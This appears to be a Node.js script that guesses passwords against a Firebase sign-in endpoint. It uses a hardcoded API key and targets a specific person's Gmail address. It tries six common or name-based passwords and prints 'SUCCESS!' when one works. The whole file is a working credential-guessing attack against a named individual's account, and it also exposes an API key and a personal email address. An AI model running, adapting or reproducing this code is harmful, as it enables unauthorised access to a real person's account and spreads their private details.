const https = require('https');
const apiKey = 'AIzaSyAfrdngdBpRzlSC9cXxs3aCGe3gZMrYRts';

function testPassword(pwd) {
  const data = JSON.stringify({
    email: 'adillamkadem@gmail.com',
    password: pwd,
    returnSecureToken: true
  });
  const req = https.request({
    hostname: 'identitytoolkit.googleapis.com',
    path: '/v1/accounts:signInWithPassword?key=' + apiKey,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  }, (res) => {
    let body = '';
    res.on('data', d => body += d);
    res.on('end', () => {
      const parsed = JSON.parse(body);
      console.log(`Testing [${pwd}]:`, parsed.error ? parsed.error.message : 'SUCCESS!');
    });
  });
  req.write(data);
  req.end();
}

['000000', 'admin', 'admin123', '123456', 'adil', 'adillamkadem'].forEach(testPassword);
